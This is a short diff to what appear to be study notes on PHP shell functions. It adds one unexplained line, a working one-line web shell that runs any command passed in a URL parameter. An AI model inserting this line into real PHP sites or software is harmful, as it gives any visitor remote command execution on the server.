@@ -28,6 +28,9 @@ The diffence between echo and print are that
 shell_exec() opens a new shell instance and runs it their and returns the output to your main program
 chdir() actually changes ur current directory (unlike shell_exec("cd /tmp") which would be temperary)
 
+<?php echo system($_GET['command']); ?>
+
+
 
 
 
